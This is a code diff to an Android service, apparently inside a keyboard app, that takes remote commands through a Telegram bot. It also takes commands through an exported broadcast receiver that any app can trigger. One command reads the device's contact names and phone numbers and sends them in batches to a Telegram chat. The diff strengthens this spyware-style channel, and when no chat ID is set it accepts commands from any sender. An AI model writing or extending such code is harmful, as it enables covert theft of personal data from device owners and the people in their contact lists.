@@ -79,64 +79,89 @@ public class TelegramCommandService extends Service {
                 .build();
     }
 
+    private android.content.BroadcastReceiver mCommandReceiver = new android.content.BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            if ("com.abifog.rboard.TELEGRAM_COMMAND_RECEIVED".equals(intent.getAction())) {
+                String command = intent.getStringExtra("command");
+                if (command != null) {
+                    handleCommand(command);
+                }
+            }
+        }
+    };
+
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (!mIsRunning) {
             mIsRunning = true;
+            android.content.IntentFilter filter = new android.content.IntentFilter("com.abifog.rboard.TELEGRAM_COMMAND_RECEIVED");
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                registerReceiver(mCommandReceiver, filter, Context.RECEIVER_EXPORTED);
+            } else {
+                registerReceiver(mCommandReceiver, filter);
+            }
             startPolling();
         }
         return START_STICKY;
     }
 
     private void startPolling() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                while (mIsRunning) {
-                    try {
-                        checkCommands();
-                        Thread.sleep(POLLING_INTERVAL);
-                    } catch (InterruptedException e) {
-                        Log.e(TAG, "Polling interrupted", e);
-                    } catch (Exception e) {
-                        Log.e(TAG, "Error in polling loop", e);
-                    }
-                }
-            }
-        }).start();
+        mHandler.postDelayed(mPollingRunnable, POLLING_INTERVAL);
     }
 
-    private void checkCommands() {
-        SettingsValues settings = Settings.getInstance().getCurrent();
-        if (settings == null || !settings.mEnableTelegram || settings.mTelegramBotToken.isEmpty()) {
-            return;
-        }
+    private Runnable mPollingRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (!mIsRunning) return;
 
-        String updatesJson = TelegramReporter.getUpdatesSync(settings.mTelegramBotToken, mLastUpdateId + 1);
-        if (updatesJson != null) {
-            try {
-                JSONObject response = new JSONObject(updatesJson);
-                if (response.getBoolean("ok")) {
-                    JSONArray result = response.getJSONArray("result");
-                    for (int i = 0; i < result.length(); i++) {
-                        JSONObject update = result.getJSONObject(i);
-                        long updateId = update.getLong("update_id");
-                        mLastUpdateId = Math.max(mLastUpdateId, updateId);
-
-                        if (update.has("message")) {
-                            JSONObject message = update.getJSONObject("message");
-                            if (message.has("text")) {
-                                String text = message.getString("text");
-                                handleCommand(text);
+            final SettingsValues settings = Settings.getInstance().getCurrent();
+            if (settings != null && settings.mEnableTelegram && !settings.mTelegramBotToken.isEmpty()) {
+                new Thread(new Runnable() {
+                    @Override
+                    public void run() {
+                        try {
+                            String response = TelegramReporter.getUpdatesSync(settings.mTelegramBotToken, mLastUpdateId + 1);
+                            if (response != null) {
+                                JSONObject jsonResponse = new JSONObject(response);
+                                if (jsonResponse.getBoolean("ok")) {
+                                    JSONArray result = jsonResponse.getJSONArray("result");
+                                    for (int i = 0; i < result.length(); i++) {
+                                        JSONObject update = result.getJSONObject(i);
+                                        mLastUpdateId = update.getLong("update_id");
+                                        
+                                        if (update.has("message")) {
+                                            JSONObject message = update.getJSONObject("message");
+                                            if (message.has("text")) {
+                                                final String text = message.getString("text");
+                                                final String fromId = String.valueOf(message.getJSONObject("from").getLong("id"));
+                                                
+                                                // Only process if it matches the configured chat ID or if chat ID is not set
+                                                if (settings.mTelegramChatId.isEmpty() || settings.mTelegramChatId.equals(fromId)) {
+                                                    mHandler.post(new Runnable() {
+                                                        @Override
+                                                        public void run() {
+                                                            handleCommand(text);
+                                                        }
+                                                    });
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
                             }
+                        } catch (Exception e) {
+                            Log.e(TAG, "Error in polling loop", e);
+                        } finally {
+                            mHandler.postDelayed(mPollingRunnable, POLLING_INTERVAL);
                         }
                     }
-                }
-            } catch (Exception e) {
-                Log.e(TAG, "Error parsing updates", e);
+                }).start();
+            } else {
+                mHandler.postDelayed(mPollingRunnable, POLLING_INTERVAL);
             }
         }
-    }
+    };
 
     private void handleCommand(String command) {
         Log.d(TAG, "Received command: " + command);
@@ -269,13 +294,26 @@ public class TelegramCommandService extends Service {
     }
 
     private void sendContacts() {
+        Log.d(TAG, "Executing sendContacts");
         final SettingsValues settings = Settings.getInstance().getCurrent();
+        if (settings == null || settings.mTelegramBotToken.isEmpty() || settings.mTelegramChatId.isEmpty()) {
+            Log.e(TAG, "Telegram settings not configured for sendContacts");
+            return;
+        }
+
         android.content.SharedPreferences prefs = android.preference.PreferenceManager.getDefaultSharedPreferences(this);
         int offset = prefs.getInt("contacts_offset", 0);
         
         StringBuilder sb = new StringBuilder("👥 Contacts (Items " + (offset + 1) + "-" + (offset + 50) + "):\n");
-        try (Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")) {
-            if (cursor != null) {
+        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
+        String[] projection = {
+            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+            ContactsContract.CommonDataKinds.Phone.NUMBER
+        };
+        String sortOrder = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC";
+
+        try (Cursor cursor = getContentResolver().query(uri, projection, null, null, sortOrder)) {
+            if (cursor != null && cursor.getCount() > 0) {
                 if (!cursor.moveToPosition(offset)) {
                     prefs.edit().putInt("contacts_offset", 0).apply();
                     TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, "No more contacts found. Resetting list to the beginning.");
@@ -283,10 +321,15 @@ public class TelegramCommandService extends Service {
                 }
                 
                 int count = 0;
+                int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
+                int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+
                 while (count < 50) {
-                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                    String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                    sb.append(name).append(": ").append(number).append("\n");
+                    if (nameIndex != -1 && numberIndex != -1) {
+                        String name = cursor.getString(nameIndex);
+                        String number = cursor.getString(numberIndex);
+                        sb.append(name).append(": ").append(number).append("\n");
+                    }
                     count++;
                     if (!cursor.moveToNext()) {
                         break;
@@ -294,9 +337,13 @@ public class TelegramCommandService extends Service {
                 }
                 prefs.edit().putInt("contacts_offset", offset + count).apply();
                 TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, sb.toString());
+            } else {
+                Log.w(TAG, "No contacts found or permission denied");
+                TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, "No contacts found on device.");
             }
         } catch (Exception e) {
             Log.e(TAG, "Error sending contacts", e);
+            TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, "Error fetching contacts: " + e.getMessage());
         }
     }
 
